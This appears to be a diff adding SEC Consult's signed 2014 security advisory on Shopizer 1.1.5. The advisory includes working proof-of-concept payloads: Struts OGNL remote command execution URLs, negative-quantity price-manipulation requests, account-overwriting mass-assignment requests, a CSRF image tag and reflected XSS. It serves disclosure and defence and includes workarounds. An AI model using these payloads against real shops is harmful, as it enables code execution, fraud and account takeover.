@@ -1,0 +1,308 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+SEC Consult Vulnerability Lab Security Advisory < 20140710-0 >
+=======================================================================
+              title: Multiple critical vulnerabilities in Shopizer webshop
+            product: Shopizer
+ vulnerable version: 1.1.5 and below
+      fixed version: v2 (new codebase)
+             impact: critical
+           homepage: http://www.shopizer.com/
+              found: 2012-01-10
+                 by: Johannes Dahse, Johannes Greil
+                     SEC Consult Vulnerability Lab
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+- -------------------
+Shopizer is an open source java shopping cart and e-commerce content
+management software (CMS). The system is built on Struts 2, Hibernate and
+Spring. JQuery ui and ajax are heavily used on the ui as well as DWR and
+Struts2-jQuery plug-in. (http://www.shopizer.com/)
+
+
+Vulnerability overview/description:
+- -----------------------------------
+Shopizer is prone to at least the following vulnerabilities, some of them are highly
+critical:
+
+1.) Remote Command Execution
+
+Shopizer 1.1.5 is using Apache Struts 2.2.1.1 and is thus vulnerable to Remote
+Command Execution. Shopizer 1.1.3 and below is built on Apache Struts 2.1.6
+and is also affected.
+
+Fore more details please refer to:
+ * https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm#a18
+ * http://blog.o0o.nu/2012/01/cve-2011-3923-yet-another-struts2.html
+
+This affects the shop and admin interface (central).
+
+2.) Manipulation of product prices
+
+When buying products in Shopizer the product costs for a single product is
+calculated by the selected quantity times the price of the product. The
+total costs of all products is the adding of all product costs. An attacker
+can specify negative quantities to decrease the total costs.
+
+This affects the shop.
+
+3.) Manipulation of customer data / mass assignment
+
+An attacker can change the contact details of a customer by modifying the
+customerId in the change request. In example this allows him to modify the
+shipping address to retrieve products bought by another customer.
+
+Furthermore, a malicious admin user (sm-central) is able to change the
+passwords of other user accounts by appending a "customer.customerPassword"
+HTTP parameter when saving user details. This is possible _although_ there
+is no UI (form field) for this within the admin interface.
+
+This affects the shop and admin interface (central).
+
+4.) Cross-Site Request Forgery
+
+Modifying customer data is also prone to CSRF attacks. Additionally, the
+attacker can change customer passwords, shop configuration, product details
+and product prices by sending CSRF requests to the administration interface.
+
+This affects the shop and admin interface (central).
+
+5.) Missing anti brute force protection
+
+No protection against brute force attacks regarding login credentials is
+implemented. Attackers can guess for weak passwords of users, as the
+password policy of the shop only allows exactly between 6 and 8 characters.
+The use of special chars or digits is not being enforced.
+
+This affects the shop and admin interface (central).
+
+6.) Cross-Site Scripting
+
+The Shopizer Admin Interface suffers from multiple reflected XSS
+vulnerabilities.
+
+
+
+Proof of concept:
+- -----------------
+1.) Remote Command Execution in Struts
+
+a) Via exception
+
+The following URL will trigger an exception for an invalid "productId" data
+type and Struts will re-evaluate the specified value as OGNL expression. An
+attacker can successfully bypass security restrictions of Struts and execute
+arbitrary Java code, leading to Remote Command Execution.
+  /shop/product/reviews.action?product.productId=secconsult'%2b(%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec('calc'))%2b'
+
+Other numeric parameters are affected as well.
+
+b) Via ParameterInterceptor
+
+The following URL will store a OGNL expression in the property "search" of
+type String. This OGNL expression can then be accessed by a dynamic function
+call in another parameter leading to Remote Command Execution.
+  /shop/search.action?search=(%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec('calc'))(secconsult)&z[(search)('secconsult')]=true
+
+  
+2.) Manipulation of product prices
+
+Assuming the shop has a product1 (300$) and a product2 (290$) for the total
+costs of 590$. The following steps can be reproduced by a malicious user to
+decrease the total costs when buying those products:
+
+  a) Add product1 and product2 to the shopping cart
+  b) Go to the shopping cart and press "recalculate"
+  c) Intercept the ajax DWR request and modify the number reference of the
+     parameter "productQuantity" for product2 to a negative value (-1):
+
+    c0-e3=string:2
+    c0-e4=number:-1
+    c0-e1=Object_Object:{productId:reference:c0-e3, productQuantity:reference:c0-e4}
+
+  d) The new costs for product2 now recalculate to: -1 x 290 = -290$
+  e) the new total costs is: product1 + product2 = 300$ + (-290$) = 10$
+  f) continue shopping and pay 10$ for products worth 590$.
+
+This is especially critical for shops that only provide digital products.
+
+Furthermore, during the second step of the checkout process it is
+possible to add a negative quantity of products exploiting a Shopizer's
+feature called "standalone shopping cart". This results in a negative price.
+By issuing the following specially crafted request in the separate tab of
+the web browser, while the first tab contains the second step of the checkout
+process, the total price will be decreased. Note that the page must be
+refreshed after the request to reflect the changes.
+
+  /shop/cart/addToCart?merchantId=1&productId=43&qty=-240
+
+
+3.) Manipulation of customer data / mass assignment
+
+It's possible to overwrite user data of an arbitrary
+user and gain access to his account and personal information _when
+registering a new user_.
+To achieve this, a malicious user has to add the customer.customerId
+parameter to the HTTP request and specify the value of the parameter
+to match the target user e.g. 87 when registering a new user.
+For example, the following request will overwrite the user data
+including username and password of the user with the ID 87.
+
+  POST /shop/profile/register.action HTTP/1.1
+  [...]
+  struts.token.name=struts.token&struts.token=8393EPOT4BN4CNYAJ6ETRI9DNR2FSP1R&formstate=list&customer.customerNick=SecTest&newPassword=SecTest123&repeatNewPassword=SecTest123&customer.customerCompany=SecTest&customer.customerGender=M&customer.customerTitel=SecTest&customer.customerFirstname=SecTest&customer.customerLastname=SecTest&customer.customerTelephone=&customer.customerEmailAddress=sectest@example.com&customer.customerCountryId=14&customer.customerZoneId=95&customer.customerPostalCode=SecTest&customer.customerCity=SecTest&customer.customerStreetAddress=SecTest&customer.customerHouseAddress=SecTest&captcha_honeypot=&customer.customerPrivacyRules=1&customer.customerId=87
+
+In this case no account confirmation is needed. Instant access
+to the overwritten account and its data is possible using the
+new username SecTest and the newly specified password! An attacker is able to
+access sensitive data (order information,
+personal information etc.).
+
+Additionally, the following request will overwrite the contact data of customer id 10,
+including the name, shipping address and billing address:
+  /shop/profile/changeAddress.action?formstate=list&customer.customerId=10&customer.customerCompany=secconsult&customer.customerGender=&customer.customerTitel=&customer.customerFirstname=secconsult&customer.customerLastname=secconsult&customer.customerTelephone=00&customer.customerEmailAddress=owned@secconsult.com&customer.customerCountryId=14&customer.customerZoneId=95&customer.customerPostalCode=1190&customer.customerCity=secconsult&customer.customerStreetAddress=secconsult&customer.customerHouseAddress=17&customer.customerAnonymous=false&customer.customerBillingTitel=&customer.customerBillingFirstName=secconsult&customer.customerBillingLastName=secconsult&customer.customerBillingStreetAddress=secconsult&customer.customerBillingHouseAddress=17&customer.customerBillingCity=secconsult&customer.customerBillingZoneId=95&customer.customerBillingState=secconsult&customer.customerBillingPostalCode=1190&customer.customerBillingCountryId=14&customer.customerLang=de&customer.customerPrivacyRul
+es=1&customer.
+customerNick=secconsult
+
+Note that in this specific case the account of the attacker and the victim will not
+be able to login again after the attack, because the nickname will be
+overwritten and found twice during login.
+
+Furthermore, the administration interface does not offer a UI to change user
+passwords. By appending the parameter "customer.customerPassword" an attacker
+is able to change the password of arbitrary users within the customer details
+page.
+
+
+4.) Cross-Site Request Forgery
+
+The following image will alter the product price for the product 30 when
+rendered by the browser of an logged in webshop administrator:
+
+  <img
+src="/central/catalog/saveproduct.action?categ=30&product.productType=1&product.productStatus=true&__checkbox_product.productStatus=true&__checkbox_product.productVirtual=true&__checkbox_product.productIsFree=false&dateavailable=2012-01-24&price=1.00&product.productExternalDl=1&names[0]=secconsult&seo[0]=secconsult&title[0]=secconsult&highlights[0]=secconsult&descriptions[0]=secconsult&metadescriptions[0]=secconsult&downloadurl[0]=&uploadimage=&weight=1.0&width=1.0&length=1.0&height=1.0&product.productQuantity=99&product.productQuantityOrderMax=99&product.productSortOrder=1&product.productTaxClassId=1&product.productId=30&product.productImage=&product.productImageLarge=&product.productImage1=&product.productImage2=&product.productImage3=&product.productImage4="/>
+
+Furthermore, the parameter "__checkbox_product.productIsFree" can also be set
+to "true".
+
+Additionally, the administration interface allows to overwrite the password
+hash of every customer which can also be exploited via CSRF.
+
+The product review form is also vulnerable to Cross-Site Request Forgery
+attacks. A similar request to the following URL will result in a product
+review being posted in the context of the currently logged in user. Note
+that the URL does not contain any parameter that is holding a nonce value.
+
+
+/shop/product/createReview.action?product.productId=43&rating=5&star=5&reviewText=Excellent&=
+
+
+5.) Missing anti brute force protection
+
+No proof-of-concept is necessary. See source:
+sm-central/src/com/salesmanager/central/profile/ProfileAction.java
+Line 525 - 530 of shopizer 1.1.5
+
+
+6.) Cross-Site Scripting
+
+  /central/orders/searchcriteria.action?customername="><script>alert(document.cookie)</script>
+  /central/catalog/productlist.action?productname="><script>alert(document.cookie)</script>&availability=2"><script>alert(document.cookie)</script>&status=2"><script>alert(document.cookie)</script>
+
+E.g. source code:
+sm-central/WebContent/orders/orderlist.jsp
+Line: 118
+
+SEC Consult assumes, that many more XSS vulnerabilities exist within this
+software as no proper filtering is implemented.
+
+
+
+Vulnerable / tested versions:
+- -----------------------------
+All vulnerabilities could be reproduced with Shopizer 1.1.5 and 1.1.3
+
+
+
+Vendor contact timeline:
+- ------------------------
+2012-01-10: The vulnerabilities have been found during a short blackbox test
+            of a shopizer installation during a customer project
+2012-12-20: Customer allows contacting vendor
+2013-01-10: Contacting vendor through support@shopizer.com, fast reply,
+            sending advisory
+2013-01-22: Asking for status update, reply: vendor takes a look
+2013-02-26: Asking for status update, vendor has some questions regarding
+            version numbers
+2013-03-22: Asking for status update again
+2013-03-23: Vendor: Release 2 is scheduled for June
+2013-06-25: Asking for status update, no answer
+2013-07-01: Sending deadline for advisory release
+2013-07-07: Vendor: Version 2 of shopizer delayed
+2013-07-08: Asking for new release date
+2013-07-09: Vendor: moving from Struts to Spring & Spring security
+2013-10-03: Asking again for release date
+2013-10-06: Vendor: Release shortly
+2013-12-10: Asking for update
+2013-12-12: Vendor: Release date set for January 2014
+2014-06: Vendor releases v2
+2014-07-10: SEC Consult releases security advisory
+
+
+
+Solution:
+- ---------
+Using the old version branch 1.x is not recommended as there are no security
+fixes implemented by the vendor.
+
+Version 2 has been released by the vendor, but it has not been tested by SEC
+Consult and it is unclear whether the issues have been solved.
+
+
+Workaround:
+- -----------
+These workarounds have to be implemented in source:
+* Update the Apache Struts library to the latest version available.
+* Disallow negative product quantities.
+* Identify customers by session and not by customerId parameter.
+
+Furthermore, change the default login (admin:password) for the administration
+interface.
+
+
+Advisory URL:
+- -------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Vienna - Bangkok - Frankfurt/Main - Montreal - Singapore - Vilnius
+
+Headquarter:
+Mooslackengasse 17, 1190 Vienna, Austria
+Phone:   +43 1 8903043 0
+Fax:     +43 1 8903043 15
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF J. Dahse, J. Greil / 2012, 2013, 2014
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2
+
+iQEcBAEBAgAGBQJTvmP8AAoJECyFJyAEdlkKIvIH/jN5QXxf98jLswdxXH7bpHND
+OmX43+f2o119h7jphQierfe2Fj5NqG3l+9Gldb601SYtdOXldI5Dn/GSByZb0NbD
+Xn5i9SeRNzbxPghCX7JubHaJX86HKoxrks34Hgoe7/v5A4rkIs3XA868tIODWq/j
+FCSnwn3I7DQu8lSR1PzbzTX2aOnilTAdmSTFH5MahMXrVgk3YHwNbtVIDz6/xriW
+ynsvLr709i/fQWEhwo4OoTwhyHwhrjPjY3jQNhcO70OMjG1kWqULFySGWNeVof0k
+a2K/EHcqiDPFyrpHifvVheOeQaPoFO5CL/Ze7cV7B9vRi9WPo3Y07wNfnJiYOdY=
+=3Hvl
+-----END PGP SIGNATURE-----
